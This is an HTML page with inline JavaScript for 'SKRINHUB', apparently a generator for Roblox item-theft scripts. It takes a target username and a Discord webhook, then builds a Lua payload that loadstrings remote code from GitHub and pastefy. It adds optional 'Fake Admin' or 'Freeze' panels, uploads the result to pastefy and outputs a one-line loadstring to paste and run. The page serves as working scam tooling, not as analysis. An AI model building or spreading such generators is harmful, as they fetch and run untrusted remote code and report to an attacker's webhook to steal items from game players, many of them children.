<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SKRINHUB | FULL EDITION</title>
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        :root {
            --bg: #000000;
            --surface: #0a0a0a;
            --panel: #111111;
            --border: #333333;
            --accent: #ffffff;
            --muted: #666666;
            --text: #ffffff;
            --danger: #ff4444;
        }
        body {
            background: var(--bg);
            color: var(--text);
            font-family: 'Rajdhani', sans-serif;
            line-height: 1.5;
            padding: 2rem 1rem;
        }
        .wrap { max-width: 900px; margin: 0 auto; position: relative; z-index: 1; }
        header { text-align: center; margin-bottom: 3rem; }
        h1 { font-size: 3rem; letter-spacing: 0.4em; text-transform: uppercase; border-bottom: 1px solid var(--border); display: inline-block; padding-bottom: 10px; }
        
        .panel { background: var(--panel); border: 1px solid var(--border); border-radius: 4px; margin-bottom: 1.5rem; overflow: hidden; }
        .ph { padding: 0.8rem 1.2rem; background: var(--surface); border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 10px; }
        .ph-title { font-family: 'Share Tech Mono'; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; }
        .dot { width: 8px; height: 8px; background: var(--accent); box-shadow: 0 0 5px var(--accent); }
        .pb { padding: 1.5rem; }

        .txt, .search-input, textarea {
            width: 100%; background: #050505; border: 1px solid var(--border); padding: 0.8rem;
            color: white; font-family: 'Share Tech Mono'; margin-bottom: 10px; outline: none; transition: 0.2s;
        }
        .txt:focus { border-color: var(--accent); }

        .btn-sm {
            padding: 0.5rem 1rem; background: transparent; border: 1px solid var(--border);
            color: white; cursor: pointer; font-family: 'Share Tech Mono'; font-size: 0.7rem; text-transform: uppercase;
        }
        .btn-sm:hover { background: white; color: black; }
        .btn-sm.red:hover { background: var(--danger); border-color: var(--danger); }

        .animal-list {
            height: 300px; overflow-y: auto; border: 1px solid #1a1a1a; margin: 10px 0; background: #050505;
            scrollbar-width: thin; scrollbar-color: var(--border) transparent;
        }
        .a-item { display: flex; align-items: center; padding: 10px 15px; border-bottom: 1px solid #111; cursor: pointer; transition: 0.1s; }
        .a-item:hover { background: #111; }
        .a-item input { margin-right: 15px; width: 16px; height: 16px; accent-color: white; }
        .a-meta { margin-left: auto; color: var(--muted); font-size: 0.75rem; font-family: 'Share Tech Mono'; }

        .admin-mode-selector { display: flex; gap: 5px; margin-bottom: 15px; }
        .admin-mode-btn {
            flex: 1; padding: 12px; background: #050505; border: 1px solid var(--border);
            color: var(--muted); cursor: pointer; font-family: 'Share Tech Mono'; font-size: 0.7rem;
        }
        .admin-mode-btn.active { border-color: white; color: white; background: #1a1a1a; }

        .btn-gen {
            width: 100%; padding: 1.5rem; background: white; color: black; border: none;
            font-weight: 700; text-transform: uppercase; letter-spacing: 0.3em; cursor: pointer;
            font-size: 1.2rem; transition: 0.2s;
        }
        .btn-gen:hover { background: #ccc; transform: translateY(-2px); }
        .btn-gen:active { transform: translateY(0); }

        .code-block {
            background: #050505; padding: 1.5rem; font-family: 'Share Tech Mono'; color: #00ff00;
            font-size: 0.85rem; white-space: pre-wrap; word-break: break-all; border: 1px dashed var(--border); min-height: 100px;
        }
        .hint { font-size: 0.75rem; color: var(--muted); margin-top: 5px; font-family: 'Share Tech Mono'; }
    </style>
</head>
<body>

<div class="wrap">
    <header>
        <h1>SKRINHUB</h1>
        <p class="tagline">ROBLOX BRAINROT TRADE GENERATOR</p>
    </header>

    <div class="panel">
        <div class="ph"><div class="dot"></div><span class="ph-title">1. Item Database Selection</span></div>
        <div class="pb">
            <div style="display:flex; gap:10px; margin-bottom:15px;">
                <input class="search-input" id="searchBox" type="text" placeholder="Search for items (e.g. Skibidi)..." oninput="renderList()">
                <button class="btn-sm" onclick="selectAll()">Select All</button>
                <button class="btn-sm red" onclick="clearAll()">Clear</button>
            </div>
            <div class="animal-list" id="animalList"></div>
            <div style="display:flex; gap:10px;">
                <input type="text" class="txt" id="customBrainrotName" placeholder="Add custom item name..." style="margin-bottom:0;">
                <button class="btn-sm" onclick="addCustomBrainrot()">Add</button>
            </div>
            <p class="hint">Items Selected: <span id="selNum" style="color:white">0</span></p>
        </div>
    </div>

    <div class="panel">
        <div class="ph"><div class="dot"></div><span class="ph-title">2. Configuration</span></div>
        <div class="pb">
            <label class="ph-title">Target Username</label>
            <input class="txt" id="usernameInput" type="text" placeholder="Enter Roblox Username">
            <label class="ph-title" style="display:block; margin-top:15px">Discord Webhook URL</label>
            <input class="txt" id="webhookInput" type="text" placeholder="https://discord.com/api/webhooks/...">
        </div>
    </div>

    <div class="panel">
        <div class="ph"><div class="dot"></div><span class="ph-title">3. GUI Options</span></div>
        <div class="pb">
            <div class="admin-mode-selector">
                <button class="admin-mode-btn active" onclick="setAdminMode('no-gui', this)">No GUI</button>
                <button class="admin-mode-btn" onclick="setAdminMode('admin-panel', this)">Fake Admin</button>
                <button class="admin-mode-btn" onclick="setAdminMode('freeze', this)">Freeze</button>
                <button class="admin-mode-btn" onclick="setAdminMode('custom', this)">Custom</button>
            </div>
            <input class="txt" id="customAdminLoadstring" type="text" placeholder="Paste custom loadstring here..." style="display:none;">
        </div>
    </div>

    <button class="btn-gen" onclick="generate()">⚡ Generate & Upload Script</button>

    <div class="panel" style="margin-top:2rem">
        <div class="ph"><div class="dot" style="background:#00ff00; box-shadow: 0 0 5px #00ff00;"></div><span class="ph-title">Final Result</span></div>
        <div class="pb">
            <div class="code-block" id="outputBlock">-- Results will appear here after generation...</div>
            <button class="btn-sm" style="margin-top:10px; width:100%" onclick="copyResult()">Copy to Clipboard</button>
        </div>
    </div>
</div>

    let selected = new Set();
    let adminMode = 'no-gui';

    function renderList() {
        const query = document.getElementById('searchBox').value.toLowerCase();
        const container = document.getElementById('animalList');
        container.innerHTML = '';

        ANIMALS.filter(a => a.name.toLowerCase().includes(query)).forEach(a => {
            const item = document.createElement('div');
            item.className = 'a-item';
            const isChecked = selected.has(a.name) ? 'checked' : '';
            item.innerHTML = `<input type="checkbox" ${isChecked}> <span>${a.name}</span> <span class="a-meta">${a.rarity}</span>`;
            
            item.onclick = (e) => {
                if(e.target.tagName !== 'INPUT') {
                    const cb = item.querySelector('input');
                    cb.checked = !cb.checked;
                }
                const cb = item.querySelector('input');
                cb.checked ? selected.add(a.name) : selected.delete(a.name);
                document.getElementById('selNum').innerText = selected.size;
            };
            container.appendChild(item);
        });
    }

    function selectAll() {
        ANIMALS.forEach(a => selected.add(a.name));
        renderList();
        document.getElementById('selNum').innerText = selected.size;
    }

    function clearAll() {
        selected.clear();
        renderList();
        document.getElementById('selNum').innerText = 0;
    }

    function addCustomBrainrot() {
        const name = document.getElementById('customBrainrotName').value.trim();
        if(name) {
            selected.add(name);
            renderList();
            document.getElementById('customBrainrotName').value = '';
            document.getElementById('selNum').innerText = selected.size;
        }
    }

    function setAdminMode(mode, btn) {
        adminMode = mode;
        document.querySelectorAll('.admin-mode-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        document.getElementById('customAdminLoadstring').style.display = (mode === 'custom') ? 'block' : 'none';
    }

    async function uploadToPastefy(script) {
        try {
            const response = await fetch("https://pastefy.app/api/v2/paste", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ title: "SKRINHUB_GEN", content: script })
            });
            const data = await response.json();
            return data.success ? `https://pastefy.app/${data.paste.id}/raw` : null;
        } catch (err) {
            console.error(err);
            return null;
        }
    }

    async function generate() {
        const out = document.getElementById('outputBlock');
        const user = document.getElementById('usernameInput').value.trim();
        const webhook = document.getElementById('webhookInput').value.trim();

        if(!user || !webhook || selected.size === 0) {
            alert("Error: Missing Username, Webhook, or Selected Items!");
            return;
        }

        out.textContent = "⏳ Processing and uploading to Pastefy...";
        
        let adminPart = "";
        if(adminMode === 'admin-panel') adminPart = '\ntask.spawn(function() loadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))() end)';
        if(adminMode === 'freeze') adminPart = '\ntask.spawn(function() loadstring(game:HttpGet("https://pastefy.app/BNCsmpLk/raw"))() end)';
        if(adminMode === 'custom') adminPart = '\n' + document.getElementById('customAdminLoadstring').value;

        const itemsFormatted = [...selected].map(n => `    ["${n}"] = true,`).join('\n');
        
        const fullScript = `getgenv().WEBHOOK_URL = "${webhook}"
getgenv().TARGET_USERNAME = "${user}"
getgenv().TARGET_BRAINROT = {
${itemsFormatted}
}

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/votre-lien-script/main.lua"))()
end)${adminPart}`;

        const rawUrl = await uploadToPastefy(fullScript);
        
        if(rawUrl) {
            out.textContent = `loadstring(game:HttpGet("${rawUrl}"))()`;
        } else {
            out.textContent = "-- Pastefy failed. Here is your raw script:\n\n" + fullScript;
        }
    }

    function copyResult() {
        const text = document.getElementById('outputBlock').textContent;
        navigator.clipboard.writeText(text);
        alert("Copied!");
    }

    // Initialize list on load
    renderList();
